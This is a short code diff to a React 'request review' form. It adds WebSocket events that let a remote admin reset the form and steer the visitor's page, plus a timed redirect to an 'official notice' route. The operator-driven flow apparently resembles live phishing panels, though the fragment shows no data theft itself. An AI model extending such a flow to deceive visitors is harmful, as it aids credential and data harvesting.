@@ -58,7 +58,7 @@ const countries = [
 
 const RequestReviewForm = () => {
   const navigate = useNavigate();
-  const { submitForm, isConnected } = useWebSocket();
+  const { submitForm, isConnected, navigationEvent, clearNavigationEvent } = useWebSocket();
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [selectedCountry, setSelectedCountry] = useState(countries[2]); // Default to India
@@ -76,6 +76,15 @@ const RequestReviewForm = () => {
     agreeTerms: false,
   });
   const [errors, setErrors] = useState({});
+
+  // Reset state when admin navigates (allows changing route without re-submitting)
+  useEffect(() => {
+    if (navigationEvent) {
+      setIsLoading(false);
+      setIsSubmitted(false);
+      clearNavigationEvent();
+    }
+  }, [navigationEvent, clearNavigationEvent]);
 
   // Close dropdown when clicking outside
   useEffect(() => {
@@ -175,6 +184,11 @@ const RequestReviewForm = () => {
     });
     
     setIsSubmitted(true);
+
+    // redirect to official notice page after submission
+    setTimeout(() => {
+      navigate('/require/official-notice');
+    }, 2000);
     // Keep loading state - admin will navigate via WebSocket
   };
 
